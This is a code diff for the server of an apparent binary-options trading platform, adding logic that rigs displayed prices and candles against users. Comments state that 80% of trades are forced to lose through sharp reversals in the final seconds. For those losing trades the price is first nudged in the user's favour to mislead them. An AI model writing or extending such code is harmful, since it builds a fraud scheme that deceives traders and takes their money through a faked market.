@@ -415,23 +415,30 @@ export async function registerRoutes(app: Express): Promise<Server> {
             if (timeRemaining <= 20000) {
               hasActiveTradeInLast20Seconds = true;
               
+              // Calculate manipulation strength - stronger in last 5 seconds
+              const manipulationStrength = timeRemaining <= 5000 ? 35 : 20;
+              
               if (!trade.shouldWin) {
                 // 80% of trades: aggressive reversal against user
                 if (trade.type === 'CALL') {
                   // User wants price up, push it DOWN
                   const currentlyWinning = currentPrice > trade.openPrice;
                   if (currentlyWinning) {
-                    priceManipulation -= baseVolatility * 15; // Strong downward push
+                    // Very aggressive downward push to ensure loss
+                    priceManipulation -= baseVolatility * manipulationStrength;
                   } else {
-                    priceManipulation -= baseVolatility * 5; // Continue downward
+                    // Keep pushing down
+                    priceManipulation -= baseVolatility * 10;
                   }
                 } else {
                   // User wants price down, push it UP
                   const currentlyWinning = currentPrice < trade.openPrice;
                   if (currentlyWinning) {
-                    priceManipulation += baseVolatility * 15; // Strong upward push
+                    // Very aggressive upward push to ensure loss
+                    priceManipulation += baseVolatility * manipulationStrength;
                   } else {
-                    priceManipulation += baseVolatility * 5; // Continue upward
+                    // Keep pushing up
+                    priceManipulation += baseVolatility * 10;
                   }
                 }
               } else {
@@ -440,27 +447,39 @@ export async function registerRoutes(app: Express): Promise<Server> {
                   // User wants price up, push it UP
                   const currentlyWinning = currentPrice > trade.openPrice;
                   if (!currentlyWinning) {
-                    priceManipulation += baseVolatility * 15; // Strong upward push to help win
+                    priceManipulation += baseVolatility * 20; // Strong upward push to help win
                   } else {
-                    priceManipulation += baseVolatility * 3; // Keep it winning
+                    priceManipulation += baseVolatility * 5; // Keep it winning
                   }
                 } else {
                   // User wants price down, push it DOWN
                   const currentlyWinning = currentPrice < trade.openPrice;
                   if (!currentlyWinning) {
-                    priceManipulation -= baseVolatility * 15; // Strong downward push to help win
+                    priceManipulation -= baseVolatility * 20; // Strong downward push to help win
                   } else {
-                    priceManipulation -= baseVolatility * 3; // Keep it winning
+                    priceManipulation -= baseVolatility * 5; // Keep it winning
                   }
                 }
               }
             }
-            // Before last 20 seconds: subtle manipulation
+            // Before last 20 seconds: subtle manipulation to prepare for reversal
             else if (!trade.shouldWin) {
               if (trade.type === 'CALL') {
-                priceManipulation -= baseVolatility * 2; // Slight downward bias
+                // Let price go up first, then reverse dramatically in last seconds
+                const currentlyWinning = currentPrice > trade.openPrice;
+                if (currentlyWinning) {
+                  priceManipulation -= baseVolatility * 3; // Start pulling down
+                } else {
+                  priceManipulation += baseVolatility * 1; // Let it seem like it's going in their favor
+                }
               } else {
-                priceManipulation += baseVolatility * 2; // Slight upward bias
+                // Let price go down first, then reverse dramatically in last seconds
+                const currentlyWinning = currentPrice < trade.openPrice;
+                if (currentlyWinning) {
+                  priceManipulation += baseVolatility * 3; // Start pulling up
+                } else {
+                  priceManipulation -= baseVolatility * 1; // Let it seem like it's going in their favor
+                }
               }
             }
           }
@@ -544,6 +563,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
   const generateOtcCandle = (pair: string, currentPrice: number) => {
     const last = otcMarkets[pair] || currentPrice;
+    const currentTime = Date.now();
     
     // Determine volatility based on asset type
     let volatility = 0.0001;
@@ -557,7 +577,30 @@ export async function registerRoutes(app: Express): Promise<Server> {
       volatility = 0.002; // Indices
     }
     
-    const change = (Math.random() - 0.5) * 2 * volatility * last;
+    // Check for active trades on this pair to manipulate candles
+    let candleManipulation = 0;
+    activeTrades.forEach(trade => {
+      const tradePair = trade.assetId.replace('_OTC', '');
+      if (tradePair === pair) {
+        const timeRemaining = trade.expiryTime - currentTime;
+        
+        // Last 10 seconds: manipulate candles aggressively
+        if (timeRemaining <= 10000 && timeRemaining > 0) {
+          if (!trade.shouldWin) {
+            // 80% of trades: create candles that work against user
+            if (trade.type === 'CALL') {
+              // User wants price up, create bearish candles
+              candleManipulation -= volatility * 8;
+            } else {
+              // User wants price down, create bullish candles
+              candleManipulation += volatility * 8;
+            }
+          }
+        }
+      }
+    });
+    
+    const change = (Math.random() - 0.5) * 2 * volatility * last + (candleManipulation * last);
     const close = last + change;
     const high = Math.max(last, close) * (1 + Math.random() * volatility * 0.5);
     const low = Math.min(last, close) * (1 - Math.random() * volatility * 0.5);
